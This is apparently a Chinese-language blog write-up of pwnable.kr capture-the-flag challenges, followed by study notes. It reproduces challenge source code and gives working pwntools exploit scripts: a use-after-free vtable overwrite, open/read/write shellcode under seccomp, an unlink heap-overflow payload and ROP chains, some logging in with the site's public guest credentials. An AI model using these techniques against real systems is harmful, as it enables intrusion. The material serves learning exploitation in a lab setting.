if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 这题需要一些知识储备，包括socket通信，管道通信，环境变量的理解和简单运用，需要耐心一个一个知识点学习。 code: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netdb.h&gt; void main()&#123; char *args[101]; int i; for(i=0;i&lt;100;i++)&#123; args[i]="A"; &#125; args['A']="\x00"; args['B']="\x20\x0a\x0d"; args['C']="5555"; args[100]=NULL; char* env[2]=&#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",NULL&#125;; int fd0[2]; int fd2[2]; pipe(fd0); pipe(fd2); FILE* fp = fopen("\x0a", "ab+"); fwrite("\x00\x00\x00\x00", 4, 1, fp); #define CHILD_READ0 fd0[0] #define PARENT_WRITE0 fd0[1] #define CHILD_READ2 fd2[0] #define PARENT_WRITE2 fd2[1] pid_t child; if((child=fork())&lt;0)&#123; printf("Error\n"); &#125;else if(child==0)&#123; close(PARENT_WRITE0); close(PARENT_WRITE2); dup2(CHILD_READ0,0); dup2(CHILD_READ2,2); close(CHILD_READ0); close(CHILD_READ2); execve("/home/input/input",args,env); &#125;else&#123; close(CHILD_READ0); close(CHILD_READ2); write(PARENT_WRITE0,"\x00\x0a\x00\xff",4); write(PARENT_WRITE2,"\x00\x0a\x02\xff",4); int sockfd, portno, n; struct sockaddr_in serv_addr; struct hostent *server; portno = atoi(args['C']); sockfd = socket(AF_INET, SOCK_STREAM, 0); server = gethostbyname("127.0.0.1"); bzero((char *) &amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; bcopy((char *)server-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, server-&gt;h_length); serv_addr.sin_port = htons(portno); sleep(5); connect(sockfd,(struct sockaddr *) &amp;serv_addr,sizeof(serv_addr)); write(sockfd,"\xde\xad\xbe\xef",4); close(sockfd); &#125;&#125; leg思路: 1. 有源码，也给了汇编码，知识题（学习arm汇编知识）： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm("mov r3, pc\n");&#125;int key2()&#123; asm( "push &#123;r6&#125;\n" "add r6, pc, $1\n" "bx r6\n" ".code 16\n" "mov r3, pc\n" "add r3, $0x4\n" "push &#123;r3&#125;\n" "pop &#123;pc&#125;\n" ".code 32\n" "pop &#123;r6&#125;\n" );&#125;int key3()&#123; asm("mov r3, lr\n");&#125;int main()&#123; int key=0; printf("Daddy has very strong arm! : "); scanf("%d", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf("Congratz!\n"); int fd = open("flag", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf("I have strong leg :P\n"); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push &#123;r4, r11, lr&#125; 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop &#123;r4, r11, pc&#125; 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 易得题意为计算key1,key2,key3的值，然后输入他们的和即可。学习知识参考以下两个链接：arm速成 跳转指令基本用法 mistake思路：1. 有源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 额，这题比较坑，要不是有hint也不知道能不能做出来。。。。。有hint就很简单了。。。。不说了吧 shellshock思路：1. 有源码： 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 根据提示和源码较为简单，猜是一道知识题 shellshock知识参考 需要注意的一点是执行cat flag时要改成 /bin/cat flag 因为sh的环境变量中未必有/bin，所以cat命令不一定能找到，最好用绝对路径。 coin1(借鉴别人的，不想写了。。)exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# coding: utf-8import socketimport randomimport timeimport reimport stringdef getweight(start, end): str_ask = [str(n) for n in range(start, end)] str_ask = " ".join(str_ask) client.send(bytes(str_ask+"\n")) str_weight = client.recv(10) str(str_weight).split("\n") weight = int(str_weight) return weightHOST = ('0.0.0.0')PORT = 9007client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client.connect((HOST, PORT))data = client.recv(1024)time.sleep(4)for i in range(100): recv_data = str(client.recv(2048)) position_of_number = (recv_data.find('N=')) position_of_chance = (recv_data.find('C=')) number = 0 chance = 0 for k in range(10): if str(recv_data[position_of_number + 2 + k]) &lt;= '9' and str(recv_data[position_of_number + 2 + k]) &gt;= '0': number = int(recv_data[position_of_number + 2 + k]) + number * 10 k += 1 else: break for k in range(100): if str(recv_data[position_of_chance + 2 + k]) &lt;= '9' and str(recv_data[position_of_chance + 2 + k]) &gt;= '0': chance = int(recv_data[position_of_chance + 2 + k]) + chance * 10 k += 1 else: break start = 0 end = number middle = int((start+end) / 2) for p in range(chance): weight=getweight(start, middle) if (middle - start) * 10 == weight: start = middle middle = int((middle + end) / 2) else: end = middle middle = int((start + middle) / 2) if (middle == start): print(end)client.send(bytes(str(start) + "\n"))s = client.recv(1024)print(s)#就是在这里昨天多加了一个enter，从而导致后面接收的数据有误(得加红加粗纪念一下）#client.send(bytes("\n", encoding="utf-8"))（垃圾代码毁我青春）s2=client.recv(1024)print(s2) blackjack思路：额，这题不想说啥，800多行代码其实就一小部分有用，就是考耐心与阅读速度，根据提示下赌注，成为百万富翁，然后就有flag了。 lotto思路：这题和上题一样也是脑洞一点的题，需要一点知识储备，就是ascii码表33号以后才为可见字符，范围大大缩小，等于在33~45的字符里随便选一个有 6/(45-33) 的概率获得flag。试几次就有了。。 cmd1思路：使参数通过滤器，利用字符串补齐功能即可。 cmd2思路：分析源代码可知是加强的过滤，需要你去了解环境变量PATH的作用和意义，extern 从外界导入变量，并且用一个函数将环境变量清空，代表所有的命令都必须是绝对路径。不能用‘/’是最操蛋的事，所以必须在根目录里用$(pwd)来显示‘ /‘，$(命令)的意义是将命令在sh里输入时的输出结果原封不动的换在$()的位置。 uaf思路： 1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0; &#125; 从这题开始就有点难度了，开始向读者介绍一些基本的pwn的方法，并且需要学很多新的知识，有知识才能解题，经过一番查阅后得知UAF为use after free/delete，即先malloc()一段空间后，free/delete后指向其的指针却没有NULL，从而继续申请一块大小相似的malloc()后（数据精心设计），这个指针将指向他，可以通过操纵这个指针来操纵这块被设计的数据空间，进而pwn。 大致思路分三步：一是先找到原来MAN申请的内存大小，作为第二个参数，二是找到虚函数表的地址，在ida里就可以解决，三是创建一个文件将修改的数据放进去(我创建文件创建不了，不知道为啥，只能从标准输入输入了)。 exp：（看别人的exp学到一个新技能，/dev/stdin） 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='uaf',port=2222,password='guest')p=s.process(executable='./uaf',argv=['./uaf','24','/dev/stdin'])p.recv(1024)p.sendline('3')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('1')p.interactive() memcpy思路： 1. 有源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 很明显要先学习知识：需要学习setvbuf()，mmap()函数，和c语言内嵌汇编的形式，以及movdqa，movntps命令是干啥的，也就是必须要理解以下这段代码是什么意思，在此分享一篇相当详细的文章 链接 1234567891011while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); 其实这题实际上想考的是堆分配时字节对齐问题。只要保证每次输入的数在他要求的范围内并且顺利运行完程序即可，问题在于movntps和movdqa要求操作的内存地址必须为16字节对齐的，所以dest必须为0x——0，可以在代码中加上一句 printf (&quot;dest: %d\n&quot;, dest) 再运行就观察起来方便很多，每次dest比上次增加的数就是上一次的size+8，自己找规律即可。 asm思路： 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 正如开头所说，第一部分为了帮我们搭一个框架，所以各方面都稍微涉及到，这题的目的是让我们对shellcode有一定的了解，分析代码，发现需要学的东西有沙箱中的seccomp() 参考1 参考2 然后他限制我们只能用open read write exit等 所以基本思路就是用read读flag中的内容，然后用write向标准输出写。然后写exp时需要用shellcraft生成调用函数的汇编代码再用反汇编生成shellcode。学会了一些写exp的新知识。 exp： 1234567891011from pwn import * s=ssh(host='pwnable.kr',user='asm',password='guest',port=2222)p=s.connect_remote('0',9026)context(arch='amd64',os='linux') shellcode=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_ file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooo oooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooo oooooo000000000000o0o0o0o0o0o0ong')shellcode+=shellcraft.open('rsp',0)shellcode+=shellcraft.read('rax','rsp',1000)shellcode+=shellcraft.write(1,'rsp',1000) p.sendline(asm(shellcode))p.interactive() unlink思路: 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 这一题算是最基础的模仿unlink的堆的题目，设计的很巧妙，简洁易懂这和初学者入手，先查阅资料得知unlink的基本原理(我看的范例是double free)，理解unlink()函数的意图是解题关键，即B-&gt;fd-&gt;bk=B-&gt;bk， B-&gt;bk-&gt;fd=B-&gt;fd 等价为*(*B+4)=*(B+4) **(B+4)= *B 改写B中fd和bk的值理论上可以向任何地址写入任何数据。 开始解题： exp： 注意：recv()接收数据以字符串的形式，例：0x456789占8个字节。print一下即可知道接收了几个字节。 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)p=s.process('./unlink')sh_addr=0x080484ebp.recvuntil('here is stack address leak: ')stack_addr=p.recv(10)stack_addr=int(stack_addr,16)p.recvuntil('here is heap address leak: ')heap_addr=p.recv(10)heap_addr=int(heap_addr,16)payload=p32(sh_addr) + 'A' * 12 + p32(heap_addr+12) +p32(stack_addr+16)p.send(payload)p.interactive() blukathorcruxes思路：1. 没有源码，只能远程下载（scp -P 2222 horcruxes@pwnable.kr:~/horcruxes Desktop）在放进ida里分析。 题目提示为rop则肯定是利用栈溢出来pwn，所以找gets()成为第一步，发现在ropme()函数里有gets()，所以思路基本确定为改写ropme()的ret，分别打印出ABCDEFG的值，然后算出sum，之后再跳到ropme()函数再执行一次拿到flag。(难点在于写exp…….) 大致步骤为：1.先用ida找到七个函数的地址，记录下来之后 2.看偏移确定payload (操蛋的是sum的范围不能超过int，必须用一个if else结构选择一下) exp1： 12345678910111213141516171819202122232425262728293031from pwn import * s=ssh(host='pwnable.kr',user='horcruxes',password='guest',port=2222)p=s.connect_remote('localhost',9032)horcruxes=[0x0809fe4b,0x0809fe6a,0x0809fe89,0x0809fea8,0x0809fec7,0x0809fee6,0x0809ff05] ropme_addr=0x0809fff9sum=0p.sendlineafter("Select Menu:",'0')p.recvuntil("How many EXP did you earned? : ")payload='a'*0x78for i in range(7): payload+=p32(horcruxes[i])payload+=p32(ropme_addr)p.sendline(payload) for i in range(7): p.recvuntil("EXP +") tmp=p.recvuntil(")",drop=True) log.info(tmp) sum+=int(tmp,10)log.info("raw sum: 0x%x" % sum)if sum&gt;pow(2,31): log.warn('try again') exit(0)elif sum&lt;-pow(2,31): log.warn('try again') exit(0)p.sendlineafter("Select Menu:",'0')p.sendlineafter("How many EXP did you earned? : ",unicode(sum))p.interactive() exp2: 1234567891011121314151617181920212223242526272829303132333435from pwn import *from ctypes import *s=ssh(port=2222,host='pwnable.kr',user='horcruxes',password='guest')HOST = "localhost"PORT = 9032r = s.remote(HOST, PORT)horcruxes = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]main_call_ropme = 0x0809fffc def main () : exp = 0 r.recvuntil("Menu:") r.sendline('1') r.recvuntil(" : ") payload = "A"*116 payload += "B"*4 # SFP for i in range (7) : payload += p32(horcruxes[i]) payload += p32(main_call_ropme) r.sendline(payload) for i in range (7) : r.recvuntil("+") tmp = r.recvuntil(")").replace(")","") log.info(tmp) exp += int(tmp) log.info("exp : " + str(c_int(exp).value)) r.recvuntil("Menu:") r.sendline("1") r.recvuntil(" : ") r.sendline(str(c_int(exp).value)) r.interactive() if __name__ == '__main__' : main() pwnable.kr第一部分到此结束，（以前有一题codemap好像挺不错的，有空可以找来看一下。）也算对这一个多月时间的交代吧，进度已经慢太多，也有不少细节问题没弄懂。。。下一部分计划是跟着ctf-wiki把栈溢出学完，然后去jarvis.oj把栈溢出的七道题做了，然后在跟着ctf-wiki体系学习。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂物1]]></title>
    <url>%2F2018%2F12%2F20%2F%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[解决的题目：kr.unlink 收获与问题： unlink收货： 对chunk结构有了初步了解 （具体） 对指针有了更加具体的概念，-&gt;代表的意义更加清晰，我个人比较喜欢用一层一层来理解指针，地址一层一层指向。以B-&gt;fd-&gt;bk=B-&gt;bk，B-&gt;bk-&gt;fd=B-&gt;fd，也就是*(*B+4)=*(B+4） **(B+4)=*B 工具更熟练，gdb了解了info frame，bt(查看函数栈框信息)，b *addr（在汇编码地址下断点） ，list funcname(查看函数代码)，file docuname(查看文件信息（主要看elf文件有没有加壳和32还是64位)（说到这我elf文件还没开始看QAQ ),s(进入函数),n(不进入函数) gdb调试 一个比较弱智的东西：怎么用gcc把代码在64位系统上编译为32位elf文件。(这是做所有题目的基础，我竟然现在才发觉OTZ) 例：gcc -m32 -o -g unlink unlink.c (需要先安32位的库，网上都有) call(先将地址压栈，后eip进入子函数),leave(mov esp,ebp pop ebp),ret(pop eip) 抄了一遍exp，大致有个印象(暂时没有花时间学，下周任务) asm收货： 读flag方法：有shell以后，cat flag或者从flag读到缓冲区在write到标准输出。（一般在有沙箱时使用） print disasm(“机器码”)。 shellcraft.sh(),shellcraft.pushstr(),shellcraft.write(),shellcraft.read()出来的都是汇编代码，需要再asm一下。 rop收货 栈溢出基本思路：找带有输入漏洞函数（scnaf,gets）的函数(不要觉得main函数特殊),然后再利用偏移控制程序执行流。一找输入漏洞，二确定利用哪一个函数ret，三rop 稍稍复杂的exp怎么写 其他收货： 写blog时git config –global user.name/user.email时总是报错说找不到.gitconfig文件，但是实际上文件就在那里，上网找了好久，好像是.gitconfig目录少了一个.git文件夹 然后我用管理员身份运行它就可以hexo d了 